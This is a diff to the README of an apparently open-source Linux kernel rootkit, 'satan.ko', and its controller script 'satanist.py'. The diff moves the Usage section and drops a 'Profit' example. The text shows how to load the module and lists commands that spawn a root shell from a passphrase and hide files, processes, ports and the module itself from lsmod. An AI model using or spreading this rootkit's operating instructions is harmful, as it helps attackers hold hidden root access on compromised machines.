@@ -11,26 +11,6 @@
 * Hide the rootkit itself
 * ...
 
-## Usage
-After inserting `satan.ko` into Linux kernel, one can use `satanist.py` to command the rootkit.
-```
-> ./satanist.py --help                 
-usage: ./satanist.py <command> [argument]
-
---privesc <passphrase>     -- Spawn a root shell (bash).
---file-hide <path>         -- File/directory hiding by absolute path.
---file-unhide <path>       -- File/directory unhiding by absolute path.
---proc-hide <pid>          -- Process hiding by PID.
---proc-unhide <pid>        -- Process unhiding by PID.
---port-hide <port>         -- Port hiding by port number.
---port-unhide <port>       -- Port unhiding by port number.
---mod-hide                 -- Module hiding (hide itself from lsmod).
---mod-unhide               -- Module unhiding (unhide itself from lsmod).
-
--h --help                  -- Help message.
--v --version               -- Version info.
-```
-
 ## Tested On
 * Debian 9 stretch 4.9.0-11
 
@@ -57,11 +37,24 @@ root# insmod satan.ko
 $ ./satanist.py --help
 ```
 
-4. Profit (?)
+## Usage
+After inserting `satan.ko` into Linux kernel, one can use `satanist.py` to command the rootkit.
 ```
-$ ./satanist.py --privesc 'Hail Satan!'
-# whoami
-root
+> ./satanist.py --help                 
+usage: ./satanist.py <command> [argument]
+
+--privesc <passphrase>     -- Spawn a root shell (bash).
+--file-hide <path>         -- File/directory hiding by absolute path.
+--file-unhide <path>       -- File/directory unhiding by absolute path.
+--proc-hide <pid>          -- Process hiding by PID.
+--proc-unhide <pid>        -- Process unhiding by PID.
+--port-hide <port>         -- Port hiding by port number.
+--port-unhide <port>       -- Port unhiding by port number.
+--mod-hide                 -- Module hiding (hide itself from lsmod).
+--mod-unhide               -- Module unhiding (unhide itself from lsmod).
+
+-h --help                  -- Help message.
+-v --version               -- Version info.
 ```
 
 ## License
